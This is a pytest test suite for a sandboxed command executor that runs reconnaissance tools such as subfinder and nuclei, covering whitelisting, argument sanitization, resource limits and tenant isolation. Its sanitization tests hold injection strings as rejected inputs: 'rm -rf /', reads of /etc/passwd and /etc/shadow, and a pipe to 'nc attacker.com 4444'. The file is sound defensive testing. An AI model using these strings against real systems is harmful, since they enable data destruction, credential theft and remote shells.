"""
Comprehensive unit tests for SecureToolExecutor

Tests cover:
- Tool validation and whitelisting
- Argument sanitization (injection prevention, path traversal)
- Context manager lifecycle (temp dir create/cleanup)
- Resource limit enforcement via _preexec_new_pgrp()
- Command execution via Popen + threading watchdog
- stdout_file parameter (OS-level redirect)
- File operations (create_input_file, read_output_file)
- Tenant isolation
- Security edge cases and negative paths
"""

import os
import resource
import subprocess
import threading
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest

from app.utils.secure_executor import SecureToolExecutor, ToolExecutionError

# Patch targets
_POPEN = "app.utils.secure_executor.subprocess.Popen"
_TIMER = "app.utils.secure_executor.threading.Timer"
_OS_KILLPG = "app.utils.secure_executor.os.killpg"
_OS_SETPGRP = "app.utils.secure_executor.os.setpgrp"
_RESOURCE_SETRLIMIT = "app.utils.secure_executor.resource.setrlimit"


def _make_mock_proc(returncode=0, stdout="", stderr=""):
    proc = MagicMock()
    proc.communicate.return_value = (stdout, stderr)
    proc.returncode = returncode
    proc.poll.return_value = returncode
    proc.pid = 99999
    return proc


class _ImmediateTimer:
    """Drop-in for threading.Timer that fires callback synchronously on start()."""

    def __init__(self, interval, callback):
        self.interval = interval
        self.daemon = True
        self._callback = callback

    def start(self):
        self._callback()

    def cancel(self):
        pass


# 1. Tool validation


class TestToolValidation:
    """validate_tool() whitelist enforcement"""

    def test_allowed_tools_accepted(self):
        executor = SecureToolExecutor(tenant_id=1)
        for tool in ("subfinder", "dnsx", "httpx", "naabu", "nuclei", "katana"):
            assert executor.validate_tool(tool) == tool

    def test_disallowed_tool_raises(self):
        executor = SecureToolExecutor(tenant_id=1)
        with pytest.raises(ToolExecutionError, match="not allowed"):
            executor.validate_tool("rm")

    def test_curl_rejected(self):
        executor = SecureToolExecutor(tenant_id=1)
        with pytest.raises(ToolExecutionError, match="not allowed"):
            executor.validate_tool("curl")

    def test_path_prefixed_tool_rejected(self):
        executor = SecureToolExecutor(tenant_id=1)
        with pytest.raises(ToolExecutionError, match="not allowed"):
            executor.validate_tool("/usr/bin/subfinder")

    def test_tool_with_semicolon_rejected(self):
        executor = SecureToolExecutor(tenant_id=1)
        with pytest.raises(ToolExecutionError, match="not allowed"):
            executor.validate_tool("subfinder; rm -rf /")

    def test_tool_with_ampersand_rejected(self):
        executor = SecureToolExecutor(tenant_id=1)
        with pytest.raises(ToolExecutionError, match="not allowed"):
            executor.validate_tool("subfinder && cat /etc/passwd")

    def test_empty_string_rejected(self):
        executor = SecureToolExecutor(tenant_id=1)
        with pytest.raises(ToolExecutionError, match="not allowed"):
            executor.validate_tool("")


# 2. Argument sanitization


class TestArgumentSanitization:
    """sanitize_args() injection prevention and path validation"""

    def test_basic_args_pass_through(self):
        executor = SecureToolExecutor(tenant_id=1)
        result = executor.sanitize_args(["-d", "example.com", "-silent"])
        assert result == ["-d", "example.com", "-silent"]

    def test_empty_list_returns_empty(self):
        executor = SecureToolExecutor(tenant_id=1)
        assert executor.sanitize_args([]) == []

    def test_dangerous_char_semicolon_drops_arg(self):
        executor = SecureToolExecutor(tenant_id=1)
        result = executor.sanitize_args(["domain.com; rm -rf /"])
        assert result == []

    def test_dangerous_char_pipe_drops_arg(self):
        executor = SecureToolExecutor(tenant_id=1)
        result = executor.sanitize_args(["domain.com | nc attacker.com 4444"])
        assert result == []

    def test_dangerous_char_ampersand_drops_arg(self):
        executor = SecureToolExecutor(tenant_id=1)
        result = executor.sanitize_args(["domain.com && whoami"])
        assert result == []

    def test_dangerous_char_backtick_drops_arg(self):
        executor = SecureToolExecutor(tenant_id=1)
        result = executor.sanitize_args(["domain.com`id`"])
        assert result == []

    def test_dangerous_char_dollar_drops_arg(self):
        executor = SecureToolExecutor(tenant_id=1)
        result = executor.sanitize_args(["domain.com$(whoami)"])
        assert result == []

    def test_all_injection_args_dropped(self):
        executor = SecureToolExecutor(tenant_id=1)
        dangerous = [
            "domain.com; cat /etc/passwd",
            "domain.com && rm -rf /",
            "domain.com | nc attacker.com 4444",
            "domain.com`rm -rf /`",
            "domain.com$(whoami)",
        ]
        result = executor.sanitize_args(dangerous)
        assert result == []

    def test_strips_leading_trailing_whitespace(self):
        executor = SecureToolExecutor(tenant_id=1)
        result = executor.sanitize_args(["  example.com  ", "\tdomain.org\t"])
        assert result == ["example.com", "domain.org"]

    def test_newline_at_end_stripped(self):
        """Trailing newline is stripped by .strip(), arg is kept."""
        executor = SecureToolExecutor(tenant_id=1)
        result = executor.sanitize_args(["domain.org\n"])
        assert result == ["domain.org"]

    def test_newline_in_middle_drops_arg(self):
        """Embedded newline (injection attempt) drops the arg."""
        executor = SecureToolExecutor(tenant_id=1)
        result = executor.sanitize_args(["domain.org\nmalicious"])
        assert result == []

    def test_none_converted_to_string(self):
        executor = SecureToolExecutor(tenant_id=1)
        result = executor.sanitize_args([None, "valid"])
        assert "valid" in result
        assert len(result) == 2

    def test_unicode_args_pass_through(self):
        executor = SecureToolExecutor(tenant_id=1)
        result = executor.sanitize_args(["xn--fiq228c5hs.example.com", "domain.org"])
        assert len(result) == 2

    def test_very_long_arg_passes_through(self):
        executor = SecureToolExecutor(tenant_id=1)
        long_arg = "a" * 10_000
        result = executor.sanitize_args([long_arg])
        assert len(result) == 1

    def test_absolute_path_outside_temp_dir_dropped(self):
        with SecureToolExecutor(tenant_id=1) as executor:
            result = executor.sanitize_args(["/etc/passwd"])
            assert result == []

    def test_absolute_path_inside_temp_dir_allowed(self):
        with SecureToolExecutor(tenant_id=1) as executor:
            temp_file = str(executor.temp_dir / "targets.txt")
            result = executor.sanitize_args([temp_file])
            assert result == [temp_file]

    def test_safe_path_prefix_allowed(self):
        executor = SecureToolExecutor(tenant_id=1)
        safe = "/home/appuser/nuclei-templates/cves/"
        result = executor.sanitize_args([safe])
        assert result == [safe]

    def test_relative_dotslash_outside_temp_dropped(self):
        with SecureToolExecutor(tenant_id=1) as executor:
            result = executor.sanitize_args(["./../../etc/shadow"])
            assert result == []


# 3. Context manager lifecycle


class TestContextManager:
    """__enter__ / __exit__ temp-dir lifecycle"""

    def test_temp_dir_none_before_enter(self):
        executor = SecureToolExecutor(tenant_id=1)
        assert executor.temp_dir is None

    def test_enter_creates_temp_dir(self):
        with SecureToolExecutor(tenant_id=1) as executor:
            assert executor.temp_dir is not None
            assert executor.temp_dir.exists()
            assert "tenant_1_" in str(executor.temp_dir)

    def test_exit_removes_temp_dir(self):
        with SecureToolExecutor(tenant_id=1) as executor:
            temp_dir = executor.temp_dir
        assert not temp_dir.exists()

    def test_cleanup_on_exception(self):
        try:
            with SecureToolExecutor(tenant_id=1) as executor:
                temp_dir = executor.temp_dir
                raise RuntimeError("intentional")
        except RuntimeError:
            pass
        assert not temp_dir.exists()

    def test_multiple_executors_isolated_dirs(self):
        with SecureToolExecutor(tenant_id=1) as ex1:
            with SecureToolExecutor(tenant_id=2) as ex2:
                assert ex1.temp_dir != ex2.temp_dir
                assert "tenant_1_" in str(ex1.temp_dir)
                assert "tenant_2_" in str(ex2.temp_dir)


# 4. Resource limits


class TestResourceLimits:
    """_preexec_new_pgrp() sets OS resource limits"""

    @patch(_OS_SETPGRP)
    @patch(_RESOURCE_SETRLIMIT)
    def test_sets_cpu_limit(self, mock_setrlimit, mock_setpgrp):
        executor = SecureToolExecutor(tenant_id=1)
        executor._preexec_new_pgrp()
        ids_set = [c[0][0] for c in mock_setrlimit.call_args_list]
        assert resource.RLIMIT_CPU in ids_set

    @patch(_OS_SETPGRP)
    @patch(_RESOURCE_SETRLIMIT)
    def test_sets_memory_limit(self, mock_setrlimit, mock_setpgrp):
        executor = SecureToolExecutor(tenant_id=1)
        executor._preexec_new_pgrp()
        ids_set = [c[0][0] for c in mock_setrlimit.call_args_list]
        assert resource.RLIMIT_AS in ids_set

    @patch(_OS_SETPGRP)
    @patch(_RESOURCE_SETRLIMIT)
    def test_sets_file_size_limit(self, mock_setrlimit, mock_setpgrp):
        executor = SecureToolExecutor(tenant_id=1)
        executor._preexec_new_pgrp()
        ids_set = [c[0][0] for c in mock_setrlimit.call_args_list]
        assert resource.RLIMIT_FSIZE in ids_set

    @patch(_OS_SETPGRP)
    @patch(_RESOURCE_SETRLIMIT)
    def test_calls_setpgrp(self, mock_setrlimit, mock_setpgrp):
        executor = SecureToolExecutor(tenant_id=1)
        executor._preexec_new_pgrp()
        mock_setpgrp.assert_called_once()

    @patch(_OS_SETPGRP)
    @patch(_RESOURCE_SETRLIMIT)
    def test_setrlimit_errors_swallowed(self, mock_setrlimit, mock_setpgrp):
        mock_setrlimit.side_effect = OSError("not permitted")
        executor = SecureToolExecutor(tenant_id=1)
        executor._preexec_new_pgrp()  # must not raise


# 5. Execute happy paths


class TestExecuteSuccess:
    """execute() normal behaviour"""

    def test_returns_tuple_on_success(self):
        proc = _make_mock_proc(returncode=0, stdout="sub1.example.com\n", stderr="")
        with patch(_POPEN, return_value=proc):
            with SecureToolExecutor(tenant_id=1) as executor:
                rc, stdout, stderr = executor.execute("subfinder", ["-d", "example.com"])
        assert rc == 0
        assert "sub1.example.com" in stdout
        assert stderr == ""

    def test_popen_called_once(self):
        proc = _make_mock_proc()
        with patch(_POPEN, return_value=proc) as mock_popen:
            with SecureToolExecutor(tenant_id=1) as executor:
                executor.execute("subfinder", ["-d", "example.com"])
        mock_popen.assert_called_once()

    def test_cmd_has_tool_as_first_element(self):
        proc = _make_mock_proc()
        with patch(_POPEN, return_value=proc) as mock_popen:
            with SecureToolExecutor(tenant_id=1) as executor:
                executor.execute("subfinder", ["-d", "example.com"])
        cmd = mock_popen.call_args[0][0]
        assert cmd[0] == "subfinder"

    def test_env_has_restricted_path(self):
        proc = _make_mock_proc()
        with patch(_POPEN, return_value=proc) as mock_popen:
            with SecureToolExecutor(tenant_id=1) as executor:
                executor.execute("subfinder", ["-d", "example.com"])
        env = mock_popen.call_args[1]["env"]
        assert "PATH" in env
        assert "LD_PRELOAD" not in env
        assert "LD_LIBRARY_PATH" not in env

    def test_cwd_is_temp_dir_string(self):
        proc = _make_mock_proc()
        with patch(_POPEN, return_value=proc) as mock_popen:
            with SecureToolExecutor(tenant_id=1) as executor:
                executor.execute("subfinder", ["-d", "example.com"])
                cwd = mock_popen.call_args[1]["cwd"]
                assert cwd == str(executor.temp_dir)

    def test_shell_is_false(self):
        proc = _make_mock_proc()
        with patch(_POPEN, return_value=proc) as mock_popen:
            with SecureToolExecutor(tenant_id=1) as executor:
                executor.execute("subfinder", ["-d", "example.com"])
        assert mock_popen.call_args[1]["shell"] is False

    def test_non_zero_returncode_returned(self):
        proc = _make_mock_proc(returncode=1, stderr="Error: host not found")
        with patch(_POPEN, return_value=proc):
            with SecureToolExecutor(tenant_id=1) as executor:
                rc, _, stderr = executor.execute("subfinder", ["-d", "invalid..domain"])
        assert rc == 1
        assert "Error" in stderr

    def test_invalid_tool_raises_before_popen(self):
        with patch(_POPEN) as mock_popen:
            with SecureToolExecutor(tenant_id=1) as executor:
                with pytest.raises(ToolExecutionError, match="not allowed"):
                    executor.execute("malicious_tool", [])
        mock_popen.assert_not_called()

    def test_custom_timeout_passed_to_timer(self):
        proc = _make_mock_proc()
        captured_intervals = []

        class _CapturingTimer:
            def __init__(self, interval, callback):
                captured_intervals.append(interval)
                self.daemon = True

            def start(self):
                pass

            def cancel(self):
                pass

        with patch(_POPEN, return_value=proc), patch(_TIMER, _CapturingTimer):
            with SecureToolExecutor(tenant_id=1) as executor:
                executor.execute("subfinder", ["-d", "example.com"], timeout=42)

        assert captured_intervals == [42]

    def test_default_timeout_uses_settings_value(self):
        proc = _make_mock_proc()
        captured_intervals = []

        class _CapturingTimer:
            def __init__(self, interval, callback):
                captured_intervals.append(interval)
                self.daemon = True

            def start(self):
                pass

            def cancel(self):
                pass

        with patch(_POPEN, return_value=proc), patch(_TIMER, _CapturingTimer):
            with SecureToolExecutor(tenant_id=1) as executor:
                expected_timeout = executor.timeout
                executor.execute("subfinder", ["-d", "example.com"])

        assert captured_intervals == [expected_timeout]

    def test_capture_output_false_uses_devnull(self):
        proc = _make_mock_proc()
        with patch(_POPEN, return_value=proc) as mock_popen:
            with SecureToolExecutor(tenant_id=1) as executor:
                executor.execute("subfinder", ["-d", "example.com"], capture_output=False)
        assert mock_popen.call_args[1]["stdout"] == subprocess.DEVNULL

    def test_capture_output_true_uses_pipe(self):
        proc = _make_mock_proc()
        with patch(_POPEN, return_value=proc) as mock_popen:
            with SecureToolExecutor(tenant_id=1) as executor:
                executor.execute("subfinder", ["-d", "example.com"], capture_output=True)
        assert mock_popen.call_args[1]["stdout"] == subprocess.PIPE


# 6. Execute error paths


class TestExecuteErrors:
    """execute() error and negative paths"""

    def test_subprocess_error_raises_tool_execution_error(self):
        with patch(_POPEN, side_effect=subprocess.SubprocessError("Command failed")):
            with SecureToolExecutor(tenant_id=1) as executor:
                with pytest.raises(ToolExecutionError, match="Execution failed"):
                    executor.execute("subfinder", ["-d", "example.com"])

    def test_generic_exception_raises_tool_execution_error(self):
        with patch(_POPEN, side_effect=OSError("No such file")):
            with SecureToolExecutor(tenant_id=1) as executor:
                with pytest.raises(ToolExecutionError, match="Unexpected error"):
                    executor.execute("subfinder", ["-d", "example.com"])

    def test_timeout_raises_tool_execution_error(self):
        proc = _make_mock_proc()
        with patch(_POPEN, return_value=proc), patch(_TIMER, _ImmediateTimer), patch(_OS_KILLPG):
            with SecureToolExecutor(tenant_id=1) as executor:
                with pytest.raises(ToolExecutionError, match="timed out"):
                    executor.execute("subfinder", ["-d", "example.com"], timeout=1)

    def test_timeout_message_includes_duration(self):
        proc = _make_mock_proc()
        with patch(_POPEN, return_value=proc), patch(_TIMER, _ImmediateTimer), patch(_OS_KILLPG):
            with SecureToolExecutor(tenant_id=1) as executor:
                with pytest.raises(ToolExecutionError, match="1s"):
                    executor.execute("subfinder", ["-d", "example.com"], timeout=1)


# 7. stdout_file parameter


class TestStdoutFile:
    """stdout_file OS-level redirect behaviour"""

    def test_popen_receives_file_object_not_pipe(self):
        """When stdout_file is set, Popen must get a real file object (not PIPE/DEVNULL)."""
        proc = _make_mock_proc(stdout=None, stderr="")
        with patch(_POPEN, return_value=proc) as mock_popen:
            with SecureToolExecutor(tenant_id=1) as executor:
                out_path = str(executor.temp_dir / "katana.json")
                executor.execute("subfinder", ["-d", "example.com"], stdout_file=out_path)

        stdout_arg = mock_popen.call_args[1]["stdout"]
        assert hasattr(stdout_arg, "write"), "stdout must be a file object"
        assert not isinstance(stdout_arg, int), "stdout must not be an int sentinel"

    def test_returns_empty_stdout_string(self):
        """execute() must return empty stdout string when stdout_file is used."""
        proc = _make_mock_proc(stdout=None, stderr="")
        with patch(_POPEN, return_value=proc):
            with SecureToolExecutor(tenant_id=1) as executor:
                out_path = str(executor.temp_dir / "out.json")
                rc, stdout, _ = executor.execute("subfinder", ["-d", "example.com"], stdout_file=out_path)
        assert stdout == ""

    def test_takes_precedence_over_capture_output(self):
        """stdout_file overrides capture_output=True."""
        proc = _make_mock_proc(stdout=None, stderr="")
        with patch(_POPEN, return_value=proc) as mock_popen:
            with SecureToolExecutor(tenant_id=1) as executor:
                out_path = str(executor.temp_dir / "out.json")
                executor.execute(
                    "subfinder",
                    ["-d", "example.com"],
                    capture_output=True,
                    stdout_file=out_path,
                )
        stdout_arg = mock_popen.call_args[1]["stdout"]
        assert hasattr(stdout_arg, "write"), "stdout_file must override capture_output=True"

    def test_real_echo_writes_to_file(self):
        """Integration: real echo binary writes output to stdout_file path."""
        with SecureToolExecutor(tenant_id=1) as executor:
            original = executor.allowed_tools
            executor.allowed_tools = original | {"echo"}
            out_path = str(executor.temp_dir / "echo_out.txt")
            rc, stdout, _ = executor.execute("echo", ["hello_easm"], stdout_file=out_path)
            # Read inside the with block — temp_dir is cleaned on exit
            assert rc == 0
            assert stdout == ""
            assert Path(out_path).read_text().strip() == "hello_easm"

    def test_file_handle_closed_after_execution(self):
        """The file handle opened for stdout_file must be closed in finally."""
        opened_handles = []
        real_open = open

        def _tracking_open(path, mode="r", **kwargs):
            fh = real_open(path, mode, **kwargs)
            opened_handles.append(fh)
            return fh

        proc = _make_mock_proc(stdout=None, stderr="")
        with patch(_POPEN, return_value=proc):
            with patch("builtins.open", side_effect=_tracking_open):
                with SecureToolExecutor(tenant_id=1) as executor:
                    out_path = str(executor.temp_dir / "out.json")
                    executor.execute("subfinder", ["-d", "example.com"], stdout_file=out_path)

        for h in opened_handles:
            assert h.closed, f"File handle {h.name!r} was not closed"


# 8. File operations


class TestFileOperations:
    """create_input_file() and read_output_file()"""

    def test_create_input_file_writes_content(self):
        with SecureToolExecutor(tenant_id=1) as executor:
            content = "example.com\ntest.org\n"
            file_path = executor.create_input_file("domains.txt", content)
            assert Path(file_path).read_text() == content

    def test_create_input_file_inside_temp_dir(self):
        with SecureToolExecutor(tenant_id=1) as executor:
            file_path = executor.create_input_file("targets.txt", "x")
            assert str(executor.temp_dir) in file_path

    def test_create_input_file_prevents_path_traversal(self):
        """Filename with path separators is sanitized to basename only."""
        with SecureToolExecutor(tenant_id=1) as executor:
            file_path = executor.create_input_file("../../evil.txt", "bad")
            assert str(executor.temp_dir) in file_path
            assert "evil.txt" in file_path

    def test_create_input_file_without_context_raises(self):
        executor = SecureToolExecutor(tenant_id=1)
        with pytest.raises(ToolExecutionError, match="not initialized"):
            executor.create_input_file("test.txt", "content")

    def test_read_output_file_returns_content(self):
        with SecureToolExecutor(tenant_id=1) as executor:
            expected = "result1\nresult2\n"
            (executor.temp_dir / "output.txt").write_text(expected)
            assert executor.read_output_file("output.txt") == expected

    def test_read_nonexistent_file_returns_empty_string(self):
        with SecureToolExecutor(tenant_id=1) as executor:
            assert executor.read_output_file("does_not_exist.txt") == ""

    def test_read_output_file_without_context_raises(self):
        executor = SecureToolExecutor(tenant_id=1)
        with pytest.raises(ToolExecutionError, match="not initialized"):
            executor.read_output_file("test.txt")

    def test_read_output_file_too_large_raises(self):
        with SecureToolExecutor(tenant_id=1) as executor:
            big_file = executor.temp_dir / "huge.bin"
            big_file.write_text("x")
            max_size = executor.max_output_size

            def fake_stat(self, **kwargs):
                class _FakeStat:
                    st_size = max_size + 1

                return _FakeStat()

            with patch.object(Path, "stat", fake_stat):
                with pytest.raises(ToolExecutionError, match="too large"):
                    executor.read_output_file("huge.bin")


# 9. Tenant isolation


class TestTenantIsolation:
    """Per-tenant environment separation"""

    def test_different_tenants_have_different_temp_dirs(self):
        with SecureToolExecutor(tenant_id=1) as ex1:
            with SecureToolExecutor(tenant_id=2) as ex2:
                assert ex1.temp_dir != ex2.temp_dir

    def test_tenant_files_do_not_cross_contaminate(self):
        with SecureToolExecutor(tenant_id=1) as ex1:
            with SecureToolExecutor(tenant_id=2) as ex2:
                ex1.create_input_file("data.txt", "tenant1_secret")
                ex2.create_input_file("data.txt", "tenant2_secret")

                assert ex1.read_output_file("data.txt") == "tenant1_secret"
                assert ex2.read_output_file("data.txt") == "tenant2_secret"

    def test_tenant_id_reflected_in_temp_dir_name(self):
        with SecureToolExecutor(tenant_id=42) as executor:
            assert "tenant_42_" in str(executor.temp_dir)
